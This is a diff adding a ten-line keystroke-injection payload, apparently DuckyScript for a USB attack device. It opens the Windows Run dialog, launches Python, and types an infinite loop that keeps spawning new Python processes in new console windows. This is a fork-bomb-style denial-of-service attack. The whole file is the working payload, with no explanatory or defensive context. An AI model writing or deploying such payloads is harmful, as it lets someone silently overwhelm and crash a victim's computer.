@@ -1,0 +1,10 @@
+GUI r
+DELAY 500
+STRING python
+ENTER
+DELAY 500
+STRING import subprocess as sp, sys
+ENTER
+STRING while True: sp.Popen([sys.executable, sys.argv[0]], creationflags=sp.CREATE_NEW_CONSOLE)
+ENTER
+ENTER
